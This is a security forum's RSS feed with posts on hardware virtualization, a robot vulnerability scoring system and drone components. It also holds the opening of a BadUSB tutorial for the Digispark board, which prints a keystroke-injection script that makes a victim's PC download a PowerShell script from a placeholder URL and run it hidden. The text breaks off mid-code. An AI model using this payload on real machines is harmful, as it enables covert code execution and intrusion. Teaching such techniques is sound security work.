|                       |        |         |                |
|   KERNEL HOST         |   VMM MODULE     |  KERNEL HOST   |
|                       |        |         |                |
 –––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
|                                |                          |
|                          HARDWARE                         |
|                                                           |

</pre>
</blockquote>
<ol start="2">
<li>The bare metal hypervisor. This one is a hypervisor running directly on the hardware (started by the BIOS). On top of this all the guests are running with their own kernels. To manage the guests there is a more privileged VM running with which you can also control the hypervisor.<br>
<em>Software examples:</em> <a href="https://en.wikipedia.org/wiki/Xen" rel="nofollow noopener">Xen</a>, <a href="https://en.wikipedia.org/wiki/Kernel-based_Virtual_Machine" rel="nofollow noopener">KVM</a>.</li>
</ol>
<blockquote>
<pre> –––––––––––––––––––––––     –––––––––––––––––––––––
|                       |   |                       |
|       GUEST OS        |   |      GUEST OS         |
|                       |   |                       |
 –––––––––––––––––––––––     –––––––––––––––––––––––
|                       |   |                       |
|     KERNEL GUEST OS   |   |   KERNEL GUEST OS     |           ...
 –––––––––––––––––––––––     –––––––––––––––––––––––   –––––––––––––––––––––
            |__________________ ________|________________________|
                               |               |
                               |               |
                               |               | &lt; MANAGES GUESTS
                               |  –––––––––––––––––––––––––––
                               | |                           |
                               | |    MANAGEMENT OS          |
                               | |                           |
                               |  –––––––––––––––––––––––––––
                               |                    |
                               |                    |
                               |                    |
 –––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
|                              |                            |
|                         HYPERVISOR (e.g. XEN)             |
|                              |                            |
 –––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
|                              |                            |
|                          HARDWARE                         |
|                                                           |

</pre>
</blockquote>
<p>This is still a pretty high level view on the whole topic. So let’s go deeper.</p>
<p>Your CPU got a hell lot of instructions which can be used by software like your kernel. Basic ones which read values from a register or more complex ones like AES encryption routines. And beside those, also a set of virtualization instructions (VMX operations).</p>
<p>To start your VM with your guest OS the VMM will set up a rule set, executes a VMXON instruction on the CPU and enters the VM.<br>
<em>“Enter the VM”</em> basically means that the processor starts executing the code of the guest OS (usually the BIOS). The processor is aware that a VM is executing code and not the actual host kernel (this processor state is called: <em>VMX non-root operation mode</em>).<br>
If the guest tries to run specific CPU instructions which are not allowed, the processor will “<em>exit</em>” the VMX non-root mode and give back control to the VMM. The VMM can look at the instruction the guest has tried to execute, executes the instruction on behalf of the guest OS (or doesn’t) and uses a VMRESUME to enter the VM again (a.k.a sets the processor state into VMX non-root mode).<br>
This game will go on and on until you decide to shut down the VM.</p>
<blockquote>
<pre>set up ––––&gt; VMXON ––––––&gt; VMLAUNCH/–––––––&gt; VM has –––––– ––––––––&gt; VMOFF
rule set                   VMRESUME         control       |
                          ^                               |
                          |                               |
                          |                         Tries to exec.
                          |                         root operation
                          |                               |
                      VMM exec.  &lt;–––– VM–exit &lt;––––––––––
                     instructions
</pre>
</blockquote>
<p>As you see the guest OS is running most the time natively on your CPU. Occasionally interrupted by VM-exits and VM-entries.<br>
Those transitions between the VM and the VMM are relatively costly in terms of CPU-cycles. When it comes to a VM-exit the processor has to</p>
<p><strong>1.</strong> save the CPU state of the guest system (copy registers etc.),<br>
<strong>2.</strong> store information about the reason for the VM-Exit,<br>
<strong>3.</strong> restore the CPU state of the VMM,<br>
<strong>4.</strong> the VMM will handle the instructions the guest OS wasn’t allowed to execute<br>
<strong>5.</strong> save the result for the guest,<br>
<strong>6.</strong> save its own CPU state and return to the VM (VMRESUME).</p>
<p>At this point we already can see why using a VM is safer than just running a normal OS. In case you’ve got some malware on your guest OS running, it will only be able to execute harmless CPU instructions. All the important ones, which could affect our host systems memory and execution flow, get executed by the VMM.</p>
<p>Because a VMM just have to handle specific instructions of the VM, the code is way less complex than of an OS kernel. Which means:<br>
<em>less code</em> → <em>smaller attack surface</em> → <em>harder to find vulnerabilities.</em></p>
<p>This process is similar to User-Mode &lt;&gt; Kernel-Mode traps on not virtualized operation systems. Although in this case we create another layer under the guest OS kernel and therefore another possibility to control processes on the upper layers.</p>
<p>This was it for now. In the next part we talk about the rule sets of the VM. It should get much clearer than why the VMM has actually that much control.</p>
<p>In case you want to program a basic hypervisor yourself, you can follow the first of those links down there.</p>
<hr>
<div align="center"> <a href="https://0x00sec.org/t/introduction-hardware-virtualization-part-4294967295/8722"><br> &lt;-- Introduction</a>
</div>
<div align="center"> <a href="https://0x00sec.org/t/the-vmcs-part-1/8739">The VMCS - Part #1 --&gt;</a> </div>
<hr>
<p><em>Do it yourself</em></p>
<ul>
<li>
<a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-1/" rel="nofollow noopener">https://rayanfam.com/topics/hypervisor-from-scratch-part-1/</a> (building a kernel module)</li>
<li>
<a href="https://software.intel.com/sites/default/files/managed/7c/f1/326019-sdm-vol-3c.pdf" rel="nofollow noopener">https://software.intel.com/sites/default/files/managed/7c/f1/326019-sdm-vol-3c.pdf</a> (raw information)</li>
<li>
<a href="https://www.codeproject.com/Articles/215458/Virtualization-for-System-Programmers" rel="nofollow noopener">https://www.codeproject.com/Articles/215458/Virtualization-for-System-Programmers</a> (same content like this, but different words and with PoC)</li>
</ul>
<p><em>But I want to read about hacky stuff!</em></p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Blue_Pill_(software)" rel="nofollow noopener">https://en.wikipedia.org/wiki/Blue_Pill_(software)</a></li>
<li><a href="https://web.archive.org/web/20110913070538/http://www.invisiblethingslab.com/resources/bh08/" rel="nofollow noopener">https://web.archive.org/web/20110913070538/http://www.invisiblethingslab.com/resources/bh08/</a></li>
<li><a href="https://web.archive.org/web/20080418123748/http://www.bluepillproject.org/" rel="nofollow noopener">https://web.archive.org/web/20080418123748/http://www.bluepillproject.org/</a></li>
</ul>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/basics-and-lifecycle-of-a-vm-part-0/8723">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/basics-and-lifecycle-of-a-vm-part-0/8723</link>
          <pubDate>Wed, 26 Sep 2018 18:20:33 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-8723</guid>
          <source url="https://0x00sec.org/t/basics-and-lifecycle-of-a-vm-part-0/8723.rss">Basics and lifecycle of a VM - Part #0</source>
        </item>
        <item>
          <title>Introduction: Hardware Virtualization - Part #4294967295</title>
          <dc:creator><![CDATA[Rot127]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <h3>Introduction: Hardware Virtualization - Part #4294967295</h3>
<p>Hey ho fellow 0x00ers,</p>
<p>Over the last weeks I have researched and wrote some articles about hardware virtualization. Nearly half of the planned articles are done. I will finish the other ones when I have some more time.<br>
Anyway, the important thing I have to mention is, that these articles only focus on Intel’s <em>hardware</em> virtualization technologies and x86_64 processors! On top of that, I only cover a fraction of the existing ways to virtualize software.</p>
<p>Nonetheless, I hope you get a deeper understanding how your VMs are kept running and how they protect you. So put your mining hat on, it is going deep down --&gt;</p>
<p>Part <span class="hashtag">#0</span> - <a href="https://0x00sec.org/t/basics-and-lifecycle-of-a-vm-part-0/8723">Basics and life cycle of a VM</a><br>
Part <span class="hashtag">#1</span> - <a href="https://0x00sec.org/t/the-vmcs-part-1/8739">The VMCS</a><br>
Part <span class="hashtag">#2</span> - <a href="https://0x00sec.org/t/a-lot-about-paging-a-little-about-virtualization-part-2/8868/2">A lot about Paging, a little about virtualization</a><br>
Part <span class="hashtag">#3</span> - VT-d<br>
Part <span class="hashtag">#4</span> - Three cheers for Qubes<br>
Part <span class="hashtag">#5</span> - Write up of a Qubes/Xen exploit<br>
Part <span class="hashtag">#X</span> - Don’t know yet, depends on my motivation, maybe something about Para-Virtualization.</p>

Edit <a href="https://0x00sec.org/t/introduction-hardware-virtualization-part-4294967295/8722/1">(click for more details)</a>
            <p><small>2 posts - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/introduction-hardware-virtualization-part-4294967295/8722">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/introduction-hardware-virtualization-part-4294967295/8722</link>
          <pubDate>Wed, 26 Sep 2018 17:37:59 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-8722</guid>
          <source url="https://0x00sec.org/t/introduction-hardware-virtualization-part-4294967295/8722.rss">Introduction: Hardware Virtualization - Part #4294967295</source>
        </item>
        <item>
          <title>Robot Vulnerability Scoring System (RVSS)</title>
          <dc:creator><![CDATA[alias]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>Hello everyone,</p>
<p>Following from <a href="https://0x00sec.org/t/robot-hacking-the-robot-security-framework-rsf/7922" class="inline-onebox">Robot hacking: the Robot Security Framework (RSF)</a> and seeing the good reception it had, I’m sharing here another piece of our work that’s been made publicly available:</p>
<p>The Robot Vulnerability Scoring System (RVSS) is an open and free to access vulnerability scoring system for robots. Created upon a review of CVSS3, it considers major relevant issues in robotics including a) robot safety aspects, b) assessment of downstream implications of a given vulnerability, c) library and third-party scoring assessments and d) environmental variables, such as time since vulnerability disclosure or exposure on the web. Find below a the material related to RVSS:</p>
<ul>
<li>
<a href="https://aliasrobotics.com/research/rvss.htm" rel="nofollow noopener">Article</a> introducing RVSS</li>
<li>
<a href="https://github.com/aliasrobotics/RVSS" rel="nofollow noopener">Python 3 implementation</a> of RVSS</li>
<li>
<a href="https://arxiv.org/pdf/1807.10357.pdf" rel="nofollow noopener">White paper</a> with a more theoretical background.</li>
</ul>
<p>RVSS aims to become the de-facto standard for rating robot vulnerabilities. If with contrast to CVSS, RVSS is  focused on the robotics security landscape. Contributions are welcome.</p>
            <p><small>6 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/robot-vulnerability-scoring-system-rvss/8661">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/robot-vulnerability-scoring-system-rvss/8661</link>
          <pubDate>Sun, 23 Sep 2018 15:14:26 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-8661</guid>
          <source url="https://0x00sec.org/t/robot-vulnerability-scoring-system-rvss/8661.rss">Robot Vulnerability Scoring System (RVSS)</source>
        </item>
        <item>
          <title>A basic overview of how drones are build and how they work</title>
          <dc:creator><![CDATA[404Err0r]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>Since I haven’t been so active in the past few months because of my lack of time, I’m coming back with some new knowledge to spread around. The 0x00sec drone is on the way to be accomplished right? So why not understand how drones generally work and even build your own.</p>
<p><strong>Disclaimer: All the information provided in this article is pure self-researching, so if I got something wrong please let me know. Also some constructive criticism is always welcomed.</strong></p>
<h1>What is a drone</h1>
<p>According to wikipedia a drone is:</p>
<blockquote>
<p>An <strong>unmanned aerial vehicle</strong> ( <strong>UAV</strong> ), commonly known as a <strong>drone</strong> , is an aircraft without a human pilot aboard. UAVs are a component of an unmanned aircraft system (UAS) which include a UAV, a ground-based controller, and a system of communications between the two. The flight of UAVs may operate with various degrees of autonomy: either under remote control by a human operator or autonomously by onboard computers.</p>
</blockquote>
<p>Typically an unmanned aircraft is made of light composite materials to reduce weight and increase maneuverability.</p>
<p>There are multiple types of drones. Here are some of them:</p>
<div class="md-table">
<table>
<thead>
<tr>
<th>Number of Propellers</th>
<th>Size</th>
<th>Range</th>
<th>Equipment</th>
</tr>
</thead>
<tbody>
<tr>
<td>Tricopter</td>
<td>Nano Drones</td>
<td>Close Range Drones</td>
<td>Drones with Camera</td>
</tr>
<tr>
<td>Quadcopter</td>
<td>Mini Drones</td>
<td>Short Range Drones</td>
<td>Drones with FPV</td>
</tr>
<tr>
<td>Hexacopter</td>
<td>Regular Size Drones</td>
<td>Mid-Range Drones</td>
<td>Drones with GPS</td>
</tr>
<tr>
<td>Octocopter</td>
<td>Large Drones</td>
<td>Endurance Drones</td>
<td>Drones with stabilizers</td>
</tr>
</tbody>
</table>
</div><p>As you can see, they can be categorized by range, size, number of propellers, etc. Of course, there are out there military drones, space drones, etc. But I mainly discuss here about types you can build and are out for the public to buy.</p>
<p>For the next part of the article, I will be talking only about FPV drones that are usually quadcopters.</p>
<h1>The anatomy of a drone</h1>
<p>In order to start building a drone, you will first need to understand what each component does. I will take each component apart and explain what is its role, but before that, let’s look at a basic overview of a basic FPV drone:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/94f0d2a42e6085ceb1156b06d97a036c3adfbf9c.jpeg" alt="" width="" height=""></p>
<p>You can think of this as 3 main parts:</p>
<ul>
<li>
<p>The FPV system consists of video streaming components such as: camera, FPV goggles and video transmitter.</p>
</li>
<li>
<p>The Flight system is helping the drone to actually fly (Flight Controller, motors, ESC, propeller, etc).</p>
</li>
<li>
<p>The Power system is made of components that distribute electrical power to the other components of the drone in order to make it work (PDB, Battery).</p>
</li>
</ul>
<h2>The FPV system</h2>
<p>As said earlier, the FPV system consists of a camera, FPV goggles and a video transmitter. Basically the camera mounted on your drone capture a video. This is sent back with the help of the video transmitter by broadcasting a signal wirelessly. This signal is caught by your video receiver, on the goggles, and it’s shown onto the screen.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/03543ea60a08904f26a25c90783493ea0298703f.jpeg" alt="" width="" height=""></p>
<h2>The flight system</h2>
<p>The flight system is composed of the following components: flight controller, R/C controller, R/C receiver, motors, ESCs and propellers. The way it works is the following:</p>
<ol>
<li>The pilot is moving the joystick on the R/C controller.</li>
<li>That signal is sent to the R/C receiver wirelessly.</li>
<li>The R/C receiver then is forwarding the signal to the flight controller.</li>
<li>The flight controller interprets these commands, calculates what speed each motor should have and send it to the ESCs.</li>
<li>The ESCs are converting this signal to voltage and sends it to the motors.</li>
<li>The motors now are producing the needed thrust to move the drone the way you wanted.</li>
</ol>
<h1>Drone components</h1>
<p>Let’s start analyzing each of the components and see exactly what is the role for each of them.</p>
<h2>Frame</h2>
<p>This is the basic building block of a drone. It acts as a skeleton in which all of the other components are placed in such a manner that they uniformly distribute the drone’s center of gravity. Usually it needs to be as strong as possible but also as light as possible. That’s why they are generally made of carbon fiber.<br>
They come in different styles and sizes but all have the same basic job.<br>
This component will also determine what propeller size you’ll need to use. You can determine that by the frame’s size (the size of a frame is just the distance between the diagonal length (in mm) from the middle of one motor to the middle of the motor directly diagonal to it).</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/ddc07f32cdd8ad9b9ba5633fb418339d6a3aab60.jpeg" alt="" width="" height=""></p>
<h2>Propellers</h2>
<p>Propellers are clove like blades structured to create a difference in air pressure. When in motion, they cut through the air creating difference in pressure between the top of the motors and the bottom. The top side is characterized by low pressure as compared to the bottom causing the drone to lift into the air.<br>
The standard way to name propellers is 5x4x4. This means you have a 5 inch propeller with a pitch of 4 inches and there are 4 blades.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bf18f965128299a4cacfa32c4ef3e6605a542f9d.jpeg" alt="" width="" height=""></p>
<h2>Motors</h2>
<p>Motors are some of the most important components. They are the driving force of the drone and they provide thrust. Thus being crucial for the drone control in terms of direction and for correct propeller’s rotation. Still, the number of motors should be the same as the number of propellers.<br>
Choosing the right motor is pretty important for the efficiency of the drone. Let’s take a look at a motor name found in the wild: <strong><em>DYS Samguk Series Wei 2207 2600kv Motor</em></strong>. The first number we encounter is 2207. This is specifying the dimensions of the motor, the motor is 22mm in diameter and have a 7mm height.<br>
For more information on motors you can have a look at these resources:<br>
<a href="https://www.dronetrest.com/t/brushless-motors-how-they-work-and-what-the-numbers-mean/564" rel="noopener nofollow ugc">Brushless motors</a><br>
<a href="https://www.youtube.com/watch?v=Ry6JJPgrfVA" rel="noopener nofollow ugc">Choosing the right motors</a></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/ccd75b44fd405de1e30930c4d3e43754af75f4b8.jpeg" alt="" width="" height=""></p>
<h2>Electronic Speed Controller (ESC)</h2>
<p>This is an electronic control board that varies the motor speed. To make this possible, the ESC is taking commands from the Flight Controller and translate them into power to the motors. Thus every motor needs it’s own ESC.<br>
It also acts as a dynamic brake. The component helps the ground pilot to approximate the height at which the drone is running in.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2ace41432c2af3c8e181cd6dbd660daae1d6745b.png" alt="" width="" height=""></p>
<h2>Flight Controller</h2>
<p>The Flight Controller is the “brain” of the drone and it’s where all the magic happens. It interprets input from receiver, GPS module, battery monitor, IMU and other onboard sensors. It regulates motor speeds, via ESCs, to provide steering, as well as triggering cameras or other payloads. It controls autopilot, waypoints, follow me, failsafe and many other autonomous functions.  The flight controller is central to the whole functioning of your drone.<br>
It also determines and calculates the drone’s altitude in respect to the amount of power it consumes.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/14c53929089578854178f6624801b054c4455f52.jpeg" alt="" width="" height=""></p>
<h2>Power Distribution Board (PDB)</h2>
<p>The PDB job is simply to distribute the power from the battery to the other relevant components such as: ESCs, Flight Controllers, VTX, FPV cam, Receiver, LEDs, etc hence the name <strong>Power Distribution Board</strong>.<br>
Most of today’s PDB boards include BECs. A BEC stands for Battery Elimination Circuit. It basically represents a voltage regulator. If a voltage regulator would not be in place, you could easily burn out the other components by providing more voltage than the specific component can handle.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/ff6dfbee165f3b157e7e6315612c7c1c8448015c.jpeg" alt="" width="" height=""></p>
<h2>The battery</h2>
<p>Now we get to the component that provides the power to your drone – the battery. Most drones use Lithium polymer (LiPo) batteries because they offer the best combination of energy density, power density, and lifetime on the market.<br>
They are made by more cells packed together. So by adding more cells you add more voltage.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/607072e342b8c4db781544040866fb281fca1eba.jpeg" alt="" width="" height=""></p>
<h2>R/C Receiver</h2>
<p>Often a standard r/c radio receiver unit. The minimum number of channels needed to control a quad is 4, but 5 is usually recommended.</p>
<h2>R/C Controller</h2>
<p>The Controller is what the pilot holds in the hands and send signals to the drone by playing with the joysticks.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/223b2b8b322f41175a3bc76b92f5481dae9ae852.jpeg" alt="" width="" height=""></p>
<h2>FPV camera</h2>
<p>FPV cameras are designed to have the lowest possible latency (the time it takes for it to capture a frame and send it back to you). Most FPV cameras do NOT provide HD output however as this increases the latency of the feed which is disastrous for FPV flying.</p>
<h2>Video Transmitter</h2>
<p>The camera would be useless without a video transmitter. This component is simply broadcasting the video feed back to the goggles.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0653f7768c9743fbf1092cf5dcfb817825d91f38.jpeg" alt="" width="" height=""></p>
<h1>Other drone technologies</h1>
<h2>Radar Positioning &amp; Return Home</h2>
<p>Many of the latest drones have dual <a href="https://www.gps.gov/systems/gnss/" rel="noopener nofollow ugc">Global Navigational Satellite Systems</a> (GNSS) such as GPS and GLONASS.<br>
The radar technology in the drone will signal the following on the remote controller display;</p>
<ul>
<li>signal that enough drone GNSS satellites have been detected and the drone is ready to fl</li>
<li>display the current position and location  of the drone in relation to the pilot</li>
<li>record the home point for ‘Return To Home’ safety feature</li>
</ul>
<h2>Obstacle Detection And Collision Avoidance Technology</h2>
<p>Many drones are now equipped with collision avoidance systems. These drone vision systems use obstacle detection sensors to scan the surroundings, while software algorithms and <a href="https://en.wikipedia.org/wiki/Simultaneous_localization_and_mapping" rel="noopener nofollow ugc">SLAM technology</a> produce the images into 3D maps allowing the flight controller to sense and avoid the object.</p>
<h2>Internal Compass &amp; Failsafe Function</h2>
<p>Allows the UAV and remote control system to know exactly its flight location.  Calibration of the Compass is required to set a home point.  The home point is the location where the drone will return to in case of loss of signal between the drone and the remote control system.  This is also know as “fail-safe function”.</p>
<h2>No Fly Zone</h2>
<p>Actually a lot of the already made drones out there waited to be sold include a “No Fly Zone” feature  to increase flight safety and prevent accidental flights in restricted areas.<br>
That’s why you better build your own  <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<h1>Conclusion</h1>
<p>Drone technologies have evolved significantly in the past few years. Thus, a lot of new technologies are on the way and a lot of improvements are waiting to be made. I think it’s a necessary thing you need to understand nowadays because they will soon be everywhere. From the Security view, this is a cool thing and a terrifying one at the same time because they are not so secure, so you can easily take control of one. But, you can also create drones for operations with a specific task in mind. A great example is the 0x00sec drone !<br>
It’s pretty expensive to build your own but you will learn a lot and have a great experience.</p>
<p>I’m sorry that I haven’t contributed to the community for a while and I have been inactive for so long, but now I’m back and hope we can continue to spread knowledge and wisdom.<br>
Cya on the IRC and thanks for reading !</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/a-basic-overview-of-how-drones-are-build-and-how-they-work/8525">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/a-basic-overview-of-how-drones-are-build-and-how-they-work/8525</link>
          <pubDate>Wed, 12 Sep 2018 11:51:13 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-8525</guid>
          <source url="https://0x00sec.org/t/a-basic-overview-of-how-drones-are-build-and-how-they-work/8525.rss">A basic overview of how drones are build and how they work</source>
        </item>
        <item>
          <title>A Complete Beginner Friendly Guide To The Digispark BadUSB</title>
          <dc:creator><![CDATA[Baud]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>The thesis I presented for my diploma was about physical security, with BadUSB devices taking the most amount of pages. I saw there’s already a pretty good post on how to make your own BadUSB starting from a vulnerable stick (<a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159">click</a>) but I’d like to make another contribution in the same subject by presenting a complete guide on how to use a very cheap programmable microcontroller board for the same purpose: the Digispark from Digistump.</p>
<p>This guide is “complete” because it will cover installation of the needed programs and drivers, include an explanation of what a BadUSB is and how it works, how to write our own scripts, and finally how to convert Rubber Ducky scripts for our little Digispark. I hope you’ll find this thread interesting and perhaps even insightful.</p>
<p><strong>1. What does “BadUSB” mean?</strong></p>
<p>We use the term <em>BadUSB</em> to describe any USB device of any type that was programmed (or <em>reprogrammed</em> in case of a vulnerable device being flashed) specifically to emulate a keyboard by sending a predetermined sequence of key press events to a computer in order to complete a task, which typically has the objective of gathering/stealing information, opening a backdoor on the victim machine, installing malware, or any imaginable action that can be achieved through use of the keyboard. This works thanks to the existence of a class of USB devices called HID, Human Interface Devices, a class including devices we use on a daily basis, such as gaming controllers, mouses, and of course, keyboards. A BadUSB works by identifying itself as a keyboard to the computer when connected, so the operating system will interpret the data sent by the device as key presses.</p>
<p>As you can easily guess from the possible uses of these devices they can be a very helpful resource to any security professional, so they gained quite some attention in little time, and as a result several ad-hoc easily programmable BadUSB sticks were released, such as the <a href="https://malduino.com/" rel="noopener nofollow ugc">Malduino</a> or the most popular model of all, the <a href="https://hakshop.com/products/usb-rubber-ducky-deluxe" rel="noopener nofollow ugc">Rubber Ducky</a>. These devices can be very helpful for sure, but their price can seem a little high when compared to the alternative of creating one yourself with just a little microcontroller board, so I highly recommend this route instead if you’re interested in playing around with a BadUSB, because even if we’ll have to tinker with more programs and settings in order to make everything work it will all be worth it in the end.</p>
<p>In fact, the board of my choice is the <a href="http://digistump.com/products/1" rel="noopener nofollow ugc">Digistump Digispark</a>, a very small programmable board based on the Attiny85 controller, it costs around $8 on the official website, but you can find it for even cheaper on eBay or from the website of other vendors, I got my three models in a single bundle which cost me $7, while a Rubber Ducky alone can cost $45, and I’ll be honest, I have more fun doing things myself instead of buying something that is already ready to use, where’s the fun and satisfaction in using that? But that’s just personal taste.</p>
<p><strong>2. I have my Digispark, how do I use it?</strong></p>
<p>Okay, now we have our board, let’s go through the steps we need to follow to prepare all the programs needed to program it. First of all we need to download the Arduino IDE from <a href="https://www.arduino.cc/en/Main/Software" rel="noopener nofollow ugc">this</a> link, install it, and open it. Once the IDE is ready, go to File &gt; Preferences, this window will open:</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/7/75fdd1d85fd237318798b04729b2027b93c63475.png" alt="0x00sec1" data-base62-sha1="gPNFytoB5zVa6hMQYn3zOcFUSGx" width="594" height="500"></p>
<p>You’ll have to paste the URL you see below in the highlighted textbox, if you have already added another URL in the textbox you can separate them with a semicolon.</p>
<pre><code>http://digistump.com/package_digistump_index.json
</code></pre>
<p>This URL will tell our IDE where to look for the packages and plug-ins related to our board, in our case, it will point to all products made by Digistump. Click OK and go to Tools &gt; Board: &gt; Board Manager, a window will open, you can type Digispark in the textbox on the top right and click on the only result called “Digistump AVR Boards”, an “Install” button will appear, and clicking on it will download and install the packages we need to program the Digispark from our handy IDE:</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/d/d56fe66000c7d5e4c9be472a1c64bfaa0bcac813.png" alt="0x00sec1" data-base62-sha1="us9rD2GDBBdA3QeiJfYZNC19zjB" width="690" height="166"></p>
<p>After the packages  are ready you can close the window and select your Digispark model by selecting it from the Tools &gt; Board menu, the first option of the Digistump family is the one you’ll most likely have in your hands now:</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/e/edd853d451ad64573fa5eba3f21e61360b047981.png" alt="0x00sec1" data-base62-sha1="xW4DFViVxitbXCBRFNvCKozj5T3" width="674" height="494"></p>
<p>Be careful, always double check the board type before loading any script on your board or you might brick it! Now it’s time to download the drivers of the board so that Windows recognizes it, without these drivers the board will appear as an unknown device. <a href="https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip" rel="noopener nofollow ugc">This</a> is a direct link to the latest version of the drivers, unzip the folder inside the archive and open one of these two executables to install the 32 or 64 bits version of the drivers:</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/1/1f1dba276954a8e312a2d5248bad5059f2eb501e.png" alt="0x00sec1" data-base62-sha1="4rguuf7pCnb4yEx5BhcFcqIlY3s" width="690" height="169"></p>
<p>Now for the final step, open the Windows Device Manager. Connect your board to the computer, you’ll see a new “Unknown Device” being added to the list of devices, but then it will disappear after a couple seconds. That was our board, click on View &gt; View Hidden Devices to make it reappear, you’ll probably see it under the “Other Devices” category, now you can right-click on it, then choose “Update driver software” &gt; “Browse my computer for driver software”, and point the textbox to the folder where you previously extracted the drivers, and make sure the “Include subfolders” checkbox is set. After this, you can click on Next and after a few seconds our board will be fully installed on our computer and ready to use.</p>
<p>Notice that when you connect it to the computer it will still disappear after a few seconds, this because the board activates some of its PINs to transmit data through the USB port to communicate with a board programmer, it won’t find one running so the board will switch mode and start using those same PINs to run the software it has loaded in memory, so the device will disconnect from the computer and stop communicating, using the computer exclusively as a power supply. This is perfectly normal.</p>
<p>To test if everything works as expected, unplug the board and load one of the examples for the Digispark, click on Compile and after a quick error check it will ask you to connect the board, do so and the program will be loaded in memory, if you followed all steps correctly the program should start running immediately, use a simple LED blink example and it should work fine. Now we can start talking about serious business.</p>
<p><strong>3. The Digispark board as a BadUSB</strong></p>
<p>Before showing you a nice list of ready scripts I would like to talk about how they work, so that you have a good understanding of what’s going on under the hood once you plug your BadUSB. Let’s take the “Execute PowerShell Script” example written by CedArctic (link to the GitHub below) and let’s examine it a bit, understanding how this one script works means understanding all of them:</p>
<pre><code>// this library allows the board to be recognized as a keyboard
#include "DigiKeyboard.h"

void setup() 
{
     // we don't need to initialize anything in this example so the setup()  function remains empty
}

void loop() 
{
    // calling the sendKeyStroke() function with 0 starts the script, it cancels the effect of all keys that are already being pressed at the time of execution to avoid conflicts
    DigiKeyboard.sendKeyStroke(0);

    // waits half a second (500 ms) before sending any other key strokes
    DigiKeyboard.delay(500);

    // presses &lt;WINDOWS&gt; + R to open run.exe and waits another half second for it to start
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);

    // writes "powershell" in the textbox of run.exe and presses ENTER to open it
    DigiKeyboard.print("powershell");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);

    // now we are on PowerShell, so the code declares a WebClient object to download our malicious script
    DigiKeyboard.print("$client = new-object System.Net.WebClient");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);

    // downloads the script from "scriptURL" as "script.ps1"
    DigiKeyboard.print("$client.DownloadFile(\"https://scriptURL\" , \"script.ps1\")");
    DigiKeyboard.delay(1000);

    // opens a new run.exe instance
    DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
    DigiKeyboard.delay(750);

    // runs the downloaded script in hidden mode
    DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\script.ps1");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    for (;;)
    {
        // empty infinite loop
    }

}
</code></pre>
<p>It’s not too complicated, isn’t it? If you understand the code above you’ll be able to write your own scripts very easily, it’s also worth noticing how the empty loop at the end is optional, you could replace it with a loop like this to make the integrated LED blink once the script has stopped executing:</p>
<pre><code>while (true)
{
    digitalWrite(0, HIGH);
    delay(300);
    digitalWrite(0, LOW);
    delay(300);
}
</code></pre>
<p>And to clear one detail up, yes, in the example above you need a direct link to your script somewhere, if you happen to be in the same LAN as the victim or if you have a VPS or a computer that can be reached over WAN with its own IP then you can use PHP like so:</p>
<pre><code>mkdir digispark_remote
mv my_ps_script.ps1 digispark_remote/my_ps_script.ps1
